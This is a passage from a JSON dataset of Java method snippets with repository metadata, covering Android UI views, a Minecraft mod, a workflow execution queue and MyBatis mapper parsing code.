"stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57974, "method_name": "getSelectedColor", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSelectedColor() {\n        return mSelectedColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57975, "method_name": "setSelectedColor", "class_name": "SimplePagerTitleView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSelectedColor(int selectedColor) {\n        mSelectedColor = selectedColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57976, "method_name": "getNormalColor", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNormalColor() {\n        return mNormalColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57977, "method_name": "setNormalColor", "class_name": "SimplePagerTitleView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNormalColor(int normalColor) {\n        mNormalColor = normalColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57978, "method_name": "executeProcedure", "class_name": "RightClickedSunflowerProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"entity\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency entity for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tEntity entity = (Entity) dependencies.get(\"entity\");\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif ((((entity instanceof LivingEntity) ? ((LivingEntity) entity).getHeldItemMainhand() : ItemStack.EMPTY)\n\t\t\t\t.getItem() == new ItemStack(Blocks.AIR, (int) (1)).getItem())) {\n\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.AIR.getDefaultState(), 3);\n\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.FLOWER_POT.getDefaultState(), 3);\n\t\t\tif (entity instanceof LivingEntity) {\n\t\t\t\tItemStack _setstack = new ItemStack(HelianthusBlock.block, (int) (1));\n\t\t\t\t_setstack.setCount((int) 1);\n\t\t\t\t((LivingEntity) entity).setHeldItem(Hand.MAIN_HAND, _setstack);\n\t\t\t\tif (entity instanceof ServerPlayerEntity)\n\t\t\t\t\t((ServerPlayerEntity) entity).inventory.markDirty();\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/RightClickedSunflowerProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 57979, "method_name": "monodroidAddReference", "class_name": "TextCellRenderer_TextCellView", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/TextCellRenderer_TextCellView.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 57980, "method_name": "monodroidClearReferences", "class_name": "TextCellRenderer_TextCellView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/TextCellRenderer_TextCellView.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 57981, "method_name": "getArg0", "class_name": "GetCardListByObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getArg0() {\n        return arg0;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/GetCardListByObject.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57982, "method_name": "setArg0", "class_name": "GetCardListByObject", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setArg0(int value) {\n        this.arg0 = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/GetCardListByObject.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57983, "method_name": "execute", "class_name": "LinksTagDirective", "params": ["Environment", "Map", "TemplateModel", "TemplateDirectiveBody"], "throws": ["TemplateException", "IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute(Environment env, Map params, TemplateModel[] loopVars, TemplateDirectiveBody body) throws TemplateException, IOException {\n        final DefaultObjectWrapperBuilder builder = new DefaultObjectWrapperBuilder(Configuration.VERSION_2_3_25);\n        String param = params.get(BeyondConst.METHOD_KEY).toString();\n        switch (param) {\n            case \"listTeams\":\n                env.setVariable(\"teams\", builder.build().wrap(linksService.listTeamLinks()));\n                break;\n            default:\n                break;\n        }\n\n        body.render(env.getOut());\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/freemarker/LinksTagDirective.java", "stars": "1", "class_props": {"extends": null, "implements": ["TemplateDirectiveModel"], "modifiers": ["public"]}}, {"id": 57984, "method_name": "getTopicId", "class_name": "TopicCostUpdate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getTopicId() {\n        return topicId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/helpdesk/TopicCostUpdate.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57985, "method_name": "setTopicId", "class_name": "TopicCostUpdate", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTopicId(int value) {\n        this.topicId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/helpdesk/TopicCostUpdate.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57986, "method_name": "getSum", "class_name": "TopicCostUpdate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "    public BigDecimal getSum() {\n        return sum;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/helpdesk/TopicCostUpdate.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57987, "method_name": "setSum", "class_name": "TopicCostUpdate", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSum(BigDecimal value) {\n        this.sum = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/helpdesk/TopicCostUpdate.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57988, "method_name": "fetchHead", "class_name": "QueuedExecutions", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "Pair<ExecutionReference,ExecutableFlow>", "snippet": "  public Pair<ExecutionReference, ExecutableFlow> fetchHead()\n      throws InterruptedException {\n    final Pair<ExecutionReference, ExecutableFlow> pair = this.queuedFlowList.take();\n    if (pair != null && pair.getFirst() != null) {\n      this.queuedFlowMap.remove(pair.getFirst().getExecId());\n    }\n    return pair;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57989, "method_name": "dequeue", "class_name": "QueuedExecutions", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void dequeue(final int executionId) {\n    if (this.queuedFlowMap.containsKey(executionId)) {\n      this.queuedFlowList.remove(this.queuedFlowMap.get(executionId));\n      this.queuedFlowMap.remove(executionId);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57990, "method_name": "enqueue", "class_name": "QueuedExecutions", "params": ["ExecutableFlow", "ExecutionReference"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void enqueue(final ExecutableFlow exflow, final ExecutionReference ref)\n      throws ExecutorManagerException {\n    if (hasExecution(exflow.getExecutionId())) {\n      final String errMsg = \"Flow already in queue \" + exflow.getExecutionId();\n      throw new ExecutorManagerException(errMsg);\n    }\n\n    final Pair<ExecutionReference, ExecutableFlow> pair =\n        new Pair<>(ref, exflow);\n    try {\n      this.queuedFlowMap.put(exflow.getExecutionId(), pair);\n      this.queuedFlowList.put(pair);\n    } catch (final InterruptedException e) {\n      final String errMsg = \"Failed to insert flow \" + exflow.getExecutionId();\n      logger.error(errMsg, e);\n      throw new ExecutorManagerException(errMsg);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57991, "method_name": "enqueueAll", "class_name": "QueuedExecutions", "params": ["Collection<Pair>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void enqueueAll(\n      final Collection<Pair<ExecutionReference, ExecutableFlow>> collection)\n      throws ExecutorManagerException {\n    for (final Pair<ExecutionReference, ExecutableFlow> pair : collection) {\n      enqueue(pair.getSecond(), pair.getFirst());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57992, "method_name": "getAllEntries", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Collection<Pair>", "snippet": "  public Collection<Pair<ExecutionReference, ExecutableFlow>> getAllEntries() {\n    return Collections.unmodifiableCollection(this.queuedFlowMap.values());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57993, "method_name": "hasExecution", "class_name": "QueuedExecutions", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasExecution(final int executionId) {\n    return this.queuedFlowMap.containsKey(executionId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57994, "method_name": "getFlow", "class_name": "QueuedExecutions", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow getFlow(final int executionId) {\n    if (hasExecution(executionId)) {\n      return this.queuedFlowMap.get(executionId).getSecond();\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57995, "method_name": "getReference", "class_name": "QueuedExecutions", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ExecutionReference", "snippet": "  public ExecutionReference getReference(final int executionId) {\n    if (hasExecution(executionId)) {\n      return this.queuedFlowMap.get(executionId).getFirst();\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57996, "method_name": "size", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long size() {\n    return this.queuedFlowList.size();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57997, "method_name": "isFull", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isFull() {\n    return size() >= this.capacity;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57998, "method_name": "isEmpty", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isEmpty() {\n    return this.queuedFlowList.isEmpty() && this.queuedFlowMap.isEmpty();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57999, "method_name": "clear", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void clear() {\n    for (final Pair<ExecutionReference, ExecutableFlow> pair : this.queuedFlowMap.values()) {\n      dequeue(pair.getFirst().getExecId());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58000, "method_name": "resolveThemeAttribute", "class_name": "ResourceUtils", "params": ["Context", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "TypedValue", "snippet": "    public static TypedValue resolveThemeAttribute(Context context, int attrId) {\n        TypedValue value = new TypedValue();\n        context.getTheme().resolveAttribute(attrId, value, true);\n        return value;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/ResourceUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58001, "method_name": "getAttributeDimension", "class_name": "ResourceUtils", "params": ["Context", "Resources", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float getAttributeDimension(final Context context, final Resources.Theme theme, final int resId) {\n        final TypedValue typedValue = new TypedValue(); // create a new typed value to received the resolved attribute\n        // value\n        final DisplayMetrics displayMetrics = context.getResources().getDisplayMetrics();\n        if (!theme.resolveAttribute(resId, typedValue, true)) // if we can't resolve the value\n        {\n            throw new Resources.NotFoundException(\"Resource ID #0x\" + Integer.toHexString(resId));\n        }\n        if (typedValue.type != TypedValue.TYPE_DIMENSION) // if the value isn't of the correct type\n        {\n            throw new Resources.NotFoundException(\"Resource ID #0x\" + Integer.toHexString(resId) + \" type #0x\"\n                    + Integer.toHexString(typedValue.type) + \" is not valid\");\n        }\n        return typedValue.getDimension(displayMetrics); // return the value of the attribute in terms of the display\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/ResourceUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58002, "method_name": "onCreateViewHolder", "class_name": "LogsAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "LogsViewHolder", "snippet": "\tpublic LogsViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n\t\treturn new LogsViewHolder(inflater.inflate(R.layout.view_log_entry, parent, false));\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/logs/LogsAdapter.java", "stars": "139", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": []}}, {"id": 58003, "method_name": "onBindViewHolder", "class_name": "LogsAdapter", "params": ["LogsViewHolder", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onBindViewHolder(@NonNull LogsViewHolder holder, int position) {\n\t\tLogEntry logEntry = filteredLogs.get(position);\n\t\tholder.timeView.setText(dateFormat.format(new Date(logEntry.getTime())));\n\t\tholder.levelView.setText(logEntry.getLevel().getKey());\n\t\tholder.tagView.setText(logEntry.getTag());\n\t\tholder.messageView.setText(logEntry.getMessage());\n\n\t\tint color = 0x22000000;\n\t\tswitch (logEntry.getLevel()) {\n\t\t\tcase DEBUG:\n\t\t\t\tcolor |= 0x0000FF;\n\t\t\t\tbreak;\n\t\t\tcase INFO:\n\t\t\t\tcolor |= 0x00AA00;\n\t\t\t\tbreak;\n\t\t\tcase WARNING:\n\t\t\t\tcolor |= 0xFFAA00;\n\t\t\t\tbreak;\n\t\t\tcase ERROR:\n\t\t\t\tcolor |= 0xFF0000;\n\t\t\t\tbreak;\n\t\t}\n\t\tholder.itemView.setBackgroundColor(color);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/logs/LogsAdapter.java", "stars": "139", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": []}}, {"id": 58004, "method_name": "getItemCount", "class_name": "LogsAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getItemCount() {\n\t\treturn filteredLogs.size();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/logs/LogsAdapter.java", "stars": "139", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": []}}, {"id": 58005, "method_name": "getLastLogTime", "class_name": "LogsAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\tpublic long getLastLogTime() {\n\t\tif (logs.isEmpty()) {\n\t\t\treturn -1;\n\t\t} else {\n\t\t\treturn logs.get(logs.size() - 1).getTime();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/logs/LogsAdapter.java", "stars": "139", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": []}}, {"id": 58006, "method_name": "appendLogs", "class_name": "LogsAdapter", "params": ["List<LogEntry>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void appendLogs(List<LogEntry> logEntries) {\n\t\tlogs.addAll(logEntries);\n\n\t\tint startIndex = filteredLogs.size();\n\t\tList<LogEntry> filteredLogsToAdd = getFilteredLogs(logEntries);\n\t\tfilteredLogs.addAll(filteredLogsToAdd);\n\n\t\tnotifyItemRangeInserted(startIndex, filteredLogsToAdd.size());\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/logs/LogsAdapter.java", "stars": "139", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": []}}, {"id": 58007, "method_name": "setFilterLogLevel", "class_name": "LogsAdapter", "params": ["LogLevel"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setFilterLogLevel(LogLevel logLevel) {\n\t\tfilterLogLevel = logLevel;\n\t\tinvalidateFilteredList();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/logs/LogsAdapter.java", "stars": "139", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": []}}, {"id": 58008, "method_name": "setFilterTags", "class_name": "LogsAdapter", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setFilterTags(List<String> tags) {\n\t\tfilterTags.clear();\n\t\tfilterTags.addAll(tags);\n\t\tfilterTags.remove(\"\");\n\t\tinvalidateFilteredList();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/logs/LogsAdapter.java", "stars": "139", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": []}}, {"id": 58009, "method_name": "invalidateFilteredList", "class_name": "LogsAdapter", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void invalidateFilteredList() {\n\t\tfilteredLogs = getFilteredLogs(logs);\n\t\tnotifyDataSetChanged();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/logs/LogsAdapter.java", "stars": "139", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": []}}, {"id": 58010, "method_name": "getFilteredLogs", "class_name": "LogsAdapter", "params": ["List<LogEntry>"], "throws": null, "modifiers": ["private"], "return_type": "List<LogEntry>", "snippet": "\tprivate List<LogEntry> getFilteredLogs(List<LogEntry> logs) {\n\t\tList<LogEntry> filteredLogs = new ArrayList<>();\n\t\tfor (LogEntry log : logs) {\n\t\t\tif (log.getLevel().getImportance() >= filterLogLevel.getImportance()) {\n\t\t\t\tif (filterTags.isEmpty() || filterTags.contains(log.getTag())) {\n\t\t\t\t\tfilteredLogs.add(log);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn filteredLogs;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/logs/LogsAdapter.java", "stars": "139", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": []}}, {"id": 58011, "method_name": "parse", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void parse() {\n    if (!configuration.isResourceLoaded(resource)) {\n      configurationElement(parser.evalNode(\"/mapper\"));\n      configuration.addLoadedResource(resource);\n      bindMapperForNamespace();\n    }\n\n    parsePendingResultMaps();\n    parsePendingCacheRefs();\n    parsePendingStatements();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58012, "method_name": "getSqlFragment", "class_name": "XMLMapperBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "XNode", "snippet": "  public XNode getSqlFragment(String refid) {\n    return sqlFragments.get(refid);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58013, "method_name": "configurationElement", "class_name": "XMLMapperBuilder", "params": ["XNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void configurationElement(XNode context) {\n    try {\n      String namespace = context.getStringAttribute(\"namespace\");\n      if (namespace == null || namespace.equals(\"\")) {\n        throw new BuilderException(\"Mapper's namespace cannot be empty\");\n      }\n      builderAssistant.setCurrentNamespace(namespace);\n      cacheRefElement(context.evalNode(\"cache-ref\"));\n      cacheElement(context.evalNode(\"cache\"));\n      parameterMapElement(context.evalNodes(\"/mapper/parameterMap\"));\n      resultMapElements(context.evalNodes(\"/mapper/resultMap\"));\n      sqlElement(context.evalNodes(\"/mapper/sql\"));\n      buildStatementFromContext(context.evalNodes(\"select|insert|update|delete\"));\n    } catch (Exception e) {\n      throw new BuilderException(\"Error parsing Mapper XML. The XML location is '\" + resource + \"'. Cause: \" + e, e);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58014, "method_name": "buildStatementFromContext", "class_name": "XMLMapperBuilder", "params": ["List<XNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void buildStatementFromContext(List<XNode> list) {\n    if (configuration.getDatabaseId() != null) {\n      buildStatementFromContext(list, configuration.getDatabaseId());\n    }\n    buildStatementFromContext(list, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58015, "method_name": "buildStatementFromContext", "class_name": "XMLMapperBuilder", "params": ["List<XNode>", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void buildStatementFromContext(List<XNode> list, String requiredDatabaseId) {\n    for (XNode context : list) {\n      final XMLStatementBuilder statementParser = new XMLStatementBuilder(configuration, builderAssistant, context, requiredDatabaseId);\n      try {\n        statementParser.parseStatementNode();\n      } catch (IncompleteElementException e) {\n        configuration.addIncompleteStatement(statementParser);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58016, "method_name": "parsePendingResultMaps", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parsePendingResultMaps() {\n    Collection<ResultMapResolver> incompleteResultMaps = configuration.getIncompleteResultMaps();\n    synchronized (incompleteResultMaps) {\n      Iterator<ResultMapResolver> iter = incompleteResultMaps.iterator();\n      while (iter.hasNext()) {\n        try {\n          iter.next().resolve();\n          iter.remove();\n        } catch (IncompleteElementException e) {\n          // ResultMap is still missing a resource...\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58017, "method_name": "parsePendingCacheRefs", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parsePendingCacheRefs() {\n    Collection<CacheRefResolver> incompleteCacheRefs = configuration.getIncompleteCacheRefs();\n    synchronized (incompleteCacheRefs) {\n      Iterator<CacheRefResolver> iter = incompleteCacheRefs.iterator();\n      while (iter.hasNext()) {\n        try {\n          iter.next().resolveCacheRef();\n          iter.remove();\n        } catch (IncompleteElementException e) {\n          // Cache ref is still missing a resource...\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58018, "method_name": "parsePendingStatements", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parsePendingStatements() {\n    Collection<XMLStatementBuilder> incompleteStatements = configuration.getIncompleteStatements();\n    synchronized (incompleteStatements) {\n      Iterator<XMLStatementBuilder> iter = incompleteStatements.iterator();\n      while (iter.hasNext()) {\n        try {\n          iter.next().parseStatementNode();\n          iter.remove();\n        } catch (IncompleteElementException e) {\n          // Statement is still 